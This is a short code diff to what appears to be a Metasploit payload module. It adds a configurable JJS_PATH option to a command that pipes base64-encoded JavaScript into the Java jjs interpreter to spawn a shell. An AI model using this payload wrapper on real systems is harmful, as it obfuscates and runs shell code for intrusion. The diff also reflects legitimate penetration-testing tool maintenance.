@@ -34,7 +34,8 @@ module MetasploitModule
       'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
     ))
     register_options [
-      OptString.new('SHELL', [ true, 'The shell to execute.', '/bin/sh' ])
+      OptString.new('SHELL', [ true, 'The shell to execute.', '/bin/sh' ]),
+      OptString.new('JJS_PATH', [ true, 'The path to JJS.', 'jjs' ])
     ]
   end
 
@@ -66,6 +67,6 @@ module MetasploitModule
   }
   minified = jcode.split("\n").map(&:lstrip).join
 
-  %Q{echo "eval(new java.lang.String(java.util.Base64.decoder.decode('#{Rex::Text.encode_base64(minified)}')));"|jjs}
+  %Q{echo "eval(new java.lang.String(java.util.Base64.decoder.decode('#{Rex::Text.encode_base64(minified)}')));"|#{datastore['JJS_PATH']}}
   end
 end
